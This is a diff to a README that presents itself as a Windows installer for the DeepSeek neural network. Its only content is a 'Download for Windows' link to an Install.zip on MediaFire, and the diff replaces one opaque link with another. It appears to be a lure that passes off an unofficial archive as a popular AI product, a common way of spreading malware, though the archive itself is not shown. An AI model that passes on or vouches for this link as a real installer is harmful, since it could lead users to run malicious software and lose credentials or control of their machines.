@@ -1,7 +1,7 @@
 # PC Version of DeepSeek Neural Network for Windows  
 
 **Download the installer:**  
-[Download for Windows](https://download1527.mediafire.com/mqwy1rw0ox5g10CZR8iy2u-ApNrKpXTJdHgtK_uEcLLMBzpkFrrKZB46fNMTCwo3wBsJQ3xMTRvtVd39usRB9KPyhQJq0L2wkI-3h3l6Bhy7NIW9o747nbl47dcuRSgALYd6MVUUGsZV8-3iF2uALZpY0AqNTcNILX9nVTfNVhY9/q13iidftcj1nnjy/Install.zip) 
+[Download for Windows](https://download1589.mediafire.com/qz1faket3rhgqt62WkGlORECQzo9yTI2vphKBrEQ8oWxe-mxZJqq_0wtCLHeizltBeuyPjEinHZueYc8ZY_9pThsmHv2QoTvgqhh9orJqT0OYxK7YH2y38qepKnWqAmImDxo8s1Er_qLKlUJ4MtNTV1I5FgaOAd7AO93aShWwO8J/su9w03xejhq84p3/Install.zip) 
 
 ---
 
